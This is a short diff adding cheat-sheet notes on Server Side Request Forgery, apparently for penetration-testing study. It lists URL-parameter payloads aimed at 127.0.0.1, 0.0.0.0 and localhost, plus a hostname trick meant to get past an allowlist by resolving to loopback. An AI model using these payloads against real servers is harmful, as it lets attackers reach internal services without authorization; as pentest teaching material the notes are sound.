@@ -1,0 +1,10 @@
+Server Side Request Forgery is a technique used to trick the webserver to connecting to itself. Perhaps there are services running on 127.0.0.1:1234 that you wish to connect. Eg:
+
+http://victim.com/?url=http://127.0.0.1:1234 
+
+Tricks:
+
+?url=http://0.0.0.0:1234
+?url=http://localhost:1234
+?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234
+# asuming that the webserver only allows assets.pentesterlab.com but its dns returns dns ptr for 127.0.0.1 for assets.pentesterlab.com.hackingwithpentesterlab.link
